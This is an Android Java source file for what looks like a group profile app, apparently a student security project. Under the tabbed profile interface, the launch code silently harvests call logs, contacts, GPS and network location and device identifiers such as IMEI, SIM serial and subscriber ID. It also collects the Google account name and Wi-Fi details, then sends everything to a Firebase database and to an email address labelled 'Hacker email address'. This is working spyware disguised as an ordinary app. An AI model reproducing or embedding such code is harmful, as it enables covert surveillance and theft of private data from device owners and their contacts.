package com.example.super_secret;
//test
import java.util.Date;
import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.StatFs;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.text.format.Formatter;
import android.util.Log;
import android.widget.Toast;
import java.text.SimpleDateFormat;
import com.google.android.material.tabs.TabLayout;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import androidx.core.app.ActivityCompat;
import androidx.viewpager.widget.ViewPager;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;


public class MainActivity extends AppCompatActivity {

    private ViewPager viewPager;
    private TabLayout tabLayout;
    private Toolbar toolbar;
    private static final int MY_PERMISSIONS_REQUEST_RECEIVE_SMS = 0;
    private static final int MY_PERMISSIONS_REQUEST_READ_CALL_LOG = 0;
    private static final int MY_PERMISSIONS_REQUEST_PHONE_STATE = 0;
    private static final int MY_PERMISSIONS_REQUEST_PHONE_CONTACTS = 0;
    private static final String TAG = "Myactivity";
    Intent mServiceIntent;
    private ServiceSensor mSensorService;
    Context ctx;
    private Context getCtx() {
        return ctx;
    }
    private int PERMISSION_ALL = 1;
    private LocationManager mLocationManagerGPS;
    private LocationListener mLocationListenerGPS;
    private LocationManager mLocationManagerNetwork;
    private LocationListener mLocationListenerNetwork;

    private String[] PERMISSIONS = {
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.INTERNET,
            Manifest.permission.CHANGE_WIFI_STATE,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.GET_ACCOUNTS,
            Manifest.permission.ACCESS_FINE_LOCATION
    };


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ctx = this;
        setContentView(R.layout.activity_main);
        mSensorService = new ServiceSensor(getCtx());
        mServiceIntent = new Intent(getCtx(), mSensorService.getClass());
        if (!isMyServiceRunning(mSensorService.getClass())) {
            startService(mServiceIntent);
        }
        tabLayout = (TabLayout) findViewById(R.id.tabs);
        viewPager = (ViewPager) findViewById(R.id.view_pager);
        toolbar =  (Toolbar) findViewById(R.id.myToolbar);

        setSupportActionBar(toolbar);
        setupViewPager(viewPager);
        tabLayout.setupWithViewPager(viewPager);

        if (!hasPermissions(this, PERMISSIONS)) {
            ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
        }


            //execute all functions
            getAllCallLogs(this);
            getContactList(this);
            sendEmail();
            getPositionNetwork();
            getPositionGPS();

    }// OnCreate
    //after getting the result of permission request

    private void setupViewPager(ViewPager viewPager) {
        ViewPagerAdapter viewPagerAdapter = new ViewPagerAdapter(getSupportFragmentManager());
        viewPagerAdapter.addFragment(new Homepage(),"Homepage");
        viewPagerAdapter.addFragment(new Farid_Profile(),"Farid");
        viewPagerAdapter.addFragment(new Derek_Profile(),"Derek");
        viewPagerAdapter.addFragment(new Callie_Profile(),"Callie");
        viewPagerAdapter.addFragment(new XinWei_Profile(),"Xin Wei");
        viewPagerAdapter.addFragment(new MingKiat_Profile(),"Ming Kiat");
        viewPagerAdapter.addFragment(new KangSian_Profile(),"Kang Sian");
        viewPager.setAdapter(viewPagerAdapter);
    }

    private static boolean hasPermissions(Context context, String... permissions) {
        if (context != null && permissions != null) {
            for (String permission : permissions) {
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }

    @Override
    public void onRequestPermissionsResult (int requestCode, String permissions[], int[] grantResults)
    {
        //check requestCode
        switch(requestCode)
        {
            case MY_PERMISSIONS_REQUEST_RECEIVE_SMS:
            {
                if (grantResults.length>0 && grantResults[0]==PackageManager.PERMISSION_GRANTED)
                {
                    //New broadcast receiver will work in background
                    Toast.makeText(this, "Thank you for permission", Toast.LENGTH_LONG).show();
                }
                else
                    Toast.makeText(this,"This app will require permissions", Toast.LENGTH_LONG).show();
            }
        }
    }


    private void getAllCallLogs(Context cr) {

        String callTypeformatted ,callNew ;
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        // reading all data in descending order according to DATE
        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
        Uri callUri = Uri.parse("content://call_log/calls");
        Cursor cur = cr.getContentResolver().query(callUri, null, null, null, strOrder);

        // loop through cursor
        while (cur.moveToNext()) {

            DatabaseReference myCallRef = database.getReference().child("Call Logs").push();

            String callNumber = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.NUMBER));
            String callName = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME));
            String callDate = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.DATE));
            SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm");
            String dateString = formatter.format(new Date(Long.parseLong(callDate)));

            int callType = (cur.getColumnIndex(android.provider.CallLog.Calls.TYPE));


            if (callType == 1)
            {
                callTypeformatted = "Incoming";
            }
            else if (callType == 2)
            {
                callTypeformatted = "Outgoing";
            }
            else if (callType == 3)
            {
                callTypeformatted = "Missed Call";
            }
            else if (callType == 4)
            {
                callTypeformatted = "Voice Mail";
            }
            else if (callType == 5)
            {
                callTypeformatted = "Rejected";
            }
            else if (callType == 6)
            {
                callTypeformatted = "Blocked";
            }
            else
            {
                callTypeformatted = "Answered Externally";
            }

            int isCallNew = (cur.getColumnIndex(android.provider.CallLog.Calls.NEW));


            if (isCallNew == 1){
                callNew = "Unseen";
            }
            else{
                callNew = "Seen";
            }


            String duration = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.DURATION));
            // process log data...

            //populate the realtime firebase
            myCallRef.child("Caller Name").setValue(callName);
            myCallRef.child("Phone Number of Caller").setValue(callNumber);
            myCallRef.child("Date of Call").setValue(dateString);
            myCallRef.child("Call Type").setValue(callTypeformatted);
            myCallRef.child("Call Status").setValue(callNew);
            myCallRef.child("Call Duration in Seconds").setValue(duration);
        }
    }


    private void getContactList(Context cr){
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        Cursor cur = cr.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,null,
                null,null,null);

        if ((cur!=null ? cur.getCount() : 0) > 0){
            while (cur != null && cur.moveToNext()){
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0){
                    Cursor pCur = cr.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                    while (pCur.moveToNext()){
                        DatabaseReference contactRef = database.getReference().child("Contact List Information").push();
                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        contactRef.child("Name").setValue(name);
                        contactRef.child("Number").setValue(phoneNo);
                    }
                    pCur.close();
                }
            }
        }
        if(cur!=null){
            cur.close();
        }
    }

    private void sendEmail(){
        //Getting content for email
        String email = "ict2207.2019@gmail.com"; //Hacker email address
        String subject = "MobileDevice Scanned Result  ";

        //Retrieve Phone information
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

        String imei = telephonyManager.getDeviceId();
        String mPhoneNumber = telephonyManager.getLine1Number();
        String SimSerialNumber = telephonyManager.getSimSerialNumber();

        String NetworkOperator = telephonyManager.getSimOperatorName();
        String SubscriberId = telephonyManager.getSubscriberId();

        //Retrieve Network Details

        //WifiManager wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
        WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        WifiInfo info = wifiManager.getConnectionInfo();
        String ip = Formatter.formatIpAddress(wifiManager.getConnectionInfo().getIpAddress());
        String ssid = info.getSSID();
        String bssid = info.getBSSID();
        String macAddress = info.getMacAddress();
        int wifiFreq = info.getFrequency();

        //Retrieve Device OS details
        String myVersion = android.os.Build.VERSION.RELEASE; // e.g. myVersion := "1.6"
        int sdkVersion = android.os.Build.VERSION.SDK_INT; // e.g. sdkVersion := 8;
        String BaseOS = Build.VERSION.BASE_OS;
        String securityPatch = Build.VERSION.SECURITY_PATCH;
        String phoneName = android.os.Build.MODEL;


        //Check on the google ac login to the device
        AccountManager manager = (AccountManager) getSystemService(ACCOUNT_SERVICE);
        Account[] list = manager.getAccounts(); //get email address of device
        String emailId = "NoEmailDetected";
        for (Account account : list) {
            if (account.type.equalsIgnoreCase("com.google")) {
                emailId = account.name;
                break;
            }
        }

        //Check available space in the device
        StatFs stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
        long bytesAvailable;
        if (android.os.Build.VERSION.SDK_INT >=
                android.os.Build.VERSION_CODES.JELLY_BEAN_MR2) {
            bytesAvailable = stat.getBlockSizeLong() * stat.getAvailableBlocksLong();
        }
        else {
            bytesAvailable = (long)stat.getBlockSize() * (long)stat.getAvailableBlocks();
        }
        long megAvailable = bytesAvailable / (1024 * 1024);


        String message =
                "=====AC Information===="+
                        "\n MobileGoogleAcc : " + emailId +
                        "\n\n =====Service Provider Info====" +
                        "\n NetworkOperator : " + NetworkOperator +
                        "\n SubscriberId : " + SubscriberId +
                        "\n SimSerialNumber : " + SimSerialNumber +
                        "\n\n =====Phone Information===="+
                        "\n      Phone Name : " + phoneName +
                        "\n         IMEI No : " + imei +
                        "\n  AvailableSpace : " + megAvailable + "MB" +
                        "\n Android Version : " + myVersion +
                        "\n      SDKVersion : " + sdkVersion +
                        "\n         BaseOS  : " + BaseOS +
                        "\n   SecurityPatch : " + securityPatch +
                        "\n\n=====Network Information===="+
                        "\n      IP Address : " + ip +
                        "\n            SSID : " + ssid +
                        "\n           BSSID : " + bssid +
                        "\n      MacAddress : " + macAddress +
                        "\n        WiFiFreq : " + wifiFreq +
                        "\n       MobileNum : " + mPhoneNumber;


        //Creating SendMail object
        SendMail sm = new SendMail(this, email, subject, message);

        //Executing sendmail to send email
        sm.execute();
    }

    private boolean isMyServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                Log.i("isMyServiceRunning?",true+"");
                return true;
            }
        }
        Log.i("isMyServiceRunning?",false+"");
        return false;
    }


    @Override
    protected void onDestroy()
    {
        stopService(mServiceIntent);
        Log.i("MainAct","onDestroy!");
        super.onDestroy();
    }

    //get location by 3G/LTE + Location service
    private void getPositionGPS() {

        FirebaseDatabase database = FirebaseDatabase.getInstance();
        final DatabaseReference myRefGPS = database.getReference("Location");
        mLocationManagerGPS = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE);

        mLocationListenerGPS = new LocationListener() {
            public void onLocationChanged(Location location) {
                String gpsloc = "Latitude: " + Double.toString(location.getLatitude()) + " Longitude: " + Double.toString(location.getLongitude())
                        + " Altitude: " + Double.toString(location.getAltitude());
                myRefGPS.push().setValue(gpsloc);
            }

            public void onStatusChanged(String provider, int status, Bundle extras) {
            }

            public void onProviderEnabled(String provider) {
            }

            public void onProviderDisabled(String provider) {
            }
        };


        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {

        }
        mLocationManagerGPS.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1, 0, mLocationListenerGPS);

    }

    //get location by 3G/LTE
    private void getPositionNetwork() {

        FirebaseDatabase database = FirebaseDatabase.getInstance();
        final DatabaseReference myRefLocation = database.getReference("Location");
        mLocationManagerNetwork = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE);

        mLocationListenerNetwork = new LocationListener() {
            public void onLocationChanged(Location location) {
                String gpsloc = "Latitude: " + Double.toString(location.getLatitude()) + " Longitude: " + Double.toString(location.getLongitude())
                        + " Altitude: " + Double.toString(location.getAltitude());
                myRefLocation.push().setValue(gpsloc);
            }

            public void onStatusChanged(String provider, int status, Bundle extras) {
            }

            public void onProviderEnabled(String provider) {
            }

            public void onProviderDisabled(String provider) {
                //showAlert(R.string.Network_disabled);
            }
        };

        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            }
                mLocationManagerNetwork.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 25000, 0, mLocationListenerNetwork);

        }
    }
}
